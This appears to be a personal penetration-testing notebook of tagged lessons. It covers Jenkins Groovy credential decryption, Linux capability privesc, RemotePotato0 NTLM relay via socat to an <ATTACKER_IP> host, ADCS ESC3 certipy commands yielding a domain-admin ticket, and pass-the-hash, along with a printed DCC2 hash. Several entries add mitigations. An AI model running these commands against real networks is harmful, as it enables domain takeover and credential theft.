#LDAP #tcpdump #Cleartext [2026-04-05] Issue: LDAP Simple Bind sends passwords in cleartext over TCP on port 389. Solution: Use tcpdump with cap_net_raw+ep capability to sniff binds on localhost/network interface.
#Linux #Capabilities #Privesc [2026-04-05] Issue: Binaries with =ep (all caps enabled) in user directories allow arbitrary file read/write as root. Solution: Check getcap -r on user home dirs and accessible binaries for escalation paths.
#Fail2ban #IptablesIP [2026-04-05] Issue: Aggressive nmap scans (--min-rate 5000) trigger automated IP bans for ~60-90 seconds. Solution: Use slower scans (-T2/-T3) or single ports. Wait for ban to lift before retrying.
#Jenkins #Groovy [2026-04-05] Groovy Script Console has direct JVM access to internal APIs: CredentialsProvider.lookupCredentials() extracts all credential types, hudson.util.Secret.decrypt() decrypts Jenkins-encrypted values, Java File I/O via new File() may bypass bash-level permission restrictions.
#Jenkins #Credentials [2026-04-05] Always enumerate plugin-specific config files (s3explorer.xml, etc.) for encrypted credential storage—multiple credential sets often exist with different permissions/purposes.
#Privesc #Password [2026-04-05] Password reuse across services/OS accounts is a high-yield enumeration vector—check backup scripts, deployment configs, CI/CD logs for plaintext passwords that may apply to root/admin accounts.
#Groovy #RCE [2026-04-05] Process output capture: avoid .text immediately after execute()—use consumeProcessOutput(StringBuffer, StringBuffer) + waitFor() pattern instead.
#Groovy #Privesc [2026-04-05] JVM File I/O (new File().text) may succeed where forked shell commands fail—JVM may inherit elevated permissions or capabilities that subprocess forking doesn't preserve.
#SSH #Auth [2026-04-05] Writing SSH keys via Groovy Java File API is viable privesc path when JVM has file write permissions that forked shells don't—critical for jenkins-to-root lateral movement.
#CrossSessionRelay #RemotePotato0 #OXID #socat #NTLMv2 #mistake #PortConflict #RPC #SessionRelay #rabbit-hole [2026-04-22] Issue: RemotePotato0 returned 0x800706bf — misdiagnosed as Server 2022 DCOM hardening, wasted time on alternative vectors. Real root cause: Responder was already holding port 135 on attacker; socat could not bind; Nigel's RPCSS OXID resolution hit Responder (not the relay) and failed. DCOM activation itself works fine on Server 2022 with correct setup. -> Solution: BEFORE running RemotePotato0, verify attacker port 135 is free (`sudo lsof -i:135`). Kill any Responder/ntlmrelayx holding it. Then: attacker runs `sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<DC_IP>:8888`; victim runs `RemotePotato0.exe -m 2 -r <ATTACKER_IP> -x <ATTACKER_IP> -p 8888 -s <SESSION_ID>`. RemotePotato0 captures NTLMv2 directly — no separate capture tool needed.

#ADCS #ESC3 #EnrollmentAgent #OnBehalfOf #PKINIT #certipy #privilege-escalation #active-directory #Template #CertificateAuth [2026-04-22] Technique: ADCS ESC3 (Enrollment Agent Abuse). Prereq: "Any Purpose" EKU in target template; privileged group (e.g. t1_admins) with enrollment rights on enrollment-agent template. Two-stage: (1) certipy req -u user@domain -p PASS -ca CA -template <AgentTemplate> → enrollment_agent.pfx (2) certipy req ... -template User -on-behalf-of DOMAIN\\_admin -pfx enrollment_agent.pfx → admin.pfx (3) certipy auth -pfx admin.pfx → DA TGT (PKINIT). Key: -on-behalf-of must use DOMAIN\\SAMAccountName format. Mitigation: Remove Any Purpose EKU, implement Approved Issuance Policies, audit template permissions quarterly.

#vulnerability #password-storage #active-directory #reconnaissance [2026-04-22] Issue: Service account plaintext password stored in AD user description field -> immediate domain foothold for attacker with LDAP read. Solution: Never store credentials in AD attributes. Use Group Managed Service Accounts (gMSA), password managers, or HSM. Impact: High — description fields are often overlooked but universally readable in AD.

#technique #credential-reuse #windows #workstation [2026-04-22] Issue: Identical password reused across domain user (Simon.Watson) and local workstation account (operator) -> offline SAM analysis from backup WIM -> NT hash -> SMB PTH -> full domain access. Solution: Enforce unique passwords via Group Policy. Prevent password reuse across domain and local accounts. Impact: Credential reuse amplifies breach — one offline hive extraction compromises both local and domain security.

#vulnerability #backup-security #media-encryption [2026-04-22] Issue: WIM backups (workstation images) stored on SMB share without encryption, accessible to backup operators (t3_admins) -> download -> offline extraction of SAM, SECURITY hives, DPAPI keys. Solution: Encrypt backups (BitLocker, product-level). Restrict share ACLs. Separate backup operator role from domain admin. Impact: Critical — unencrypted backups = full offline compromise of all credentials on that machine.

#waf-loop #hash-cracking #dcc2 [2026-04-22] DCC2 cracking with rockyou.txt (14M words) + corporate password list (111K) failed -> hash: $DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325. Reason: Password not in common wordlists. Workaround used: credential reuse detection (operator local account) confirmed NT hash without needing to crack DCC2. Lesson: DCC2 is resilient to dictionary attacks; prioritize credential reuse and offline extraction of plaintext equivalents (e.g., NT hashes from SAM).
